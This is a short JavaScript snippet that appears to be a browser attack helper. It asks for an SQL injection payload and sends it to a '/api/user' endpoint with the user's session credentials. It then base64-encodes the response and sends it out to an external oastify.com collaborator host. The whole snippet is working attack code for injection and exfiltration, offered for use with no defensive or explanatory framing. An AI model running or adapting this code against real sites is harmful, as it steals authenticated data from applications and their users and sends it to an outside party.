let p = prompt('SQLi payload:');
fetch('/api/user?id=' + encodeURIComponent(p), {credentials: 'include'})
  .then(r => r.text())
  .then(d => fetch('https://woohy4p5ihcmn0l20ja5u9hpvg17pxdm.oastify.com/?d=' + btoa(d)));
